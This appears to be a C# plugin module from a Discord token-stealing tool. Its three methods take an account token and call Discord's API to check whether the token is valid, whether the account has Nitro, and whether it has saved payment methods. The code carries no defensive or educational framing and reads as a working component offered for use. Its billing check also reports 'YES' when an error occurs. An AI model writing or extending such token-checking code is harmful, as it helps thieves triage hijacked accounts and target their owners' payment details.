using System.Net;

namespace Plugin
{
    class Net
    {
        public static string TokenState(string token)
        {
            try
            {
                using (WebClient http = new WebClient())
                {
                    http.Headers.Add("Authorization", token);
                    string result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
                    return result.Contains("Unauthorized") ? "Valid: NO" : "Valid: YES";
                }
            }
            catch { }
            return "Valid: NO";
        }

        public static string NitroState(string token)
        {
            try
            {
                using (WebClient http = new WebClient())
                {
                    http.Headers.Add("Authorization", token);
                    string result = http.DownloadString("https://discordapp.com/api/v6/users/@me/billing/subscriptions");
                    return !result.Contains("created_at") ? "Nitro: NO" : "Nitro: YES";
                }
            }
            catch { }
            return "Nitro: NO";
        }

        public static string BillingState(string token)
        {
            try
            {
                using (WebClient http = new WebClient())
                {
                    http.Headers.Add("Authorization", token);
                    string result = http.DownloadString("https://discordapp.com/api/v6/users/@me/billing/payment-sources");
                    return !result.Contains("type") ? "Billing: NO" : "Billing: YES";
                }
            }
            catch { }
            return "Billing: YES";
        }
    }
}
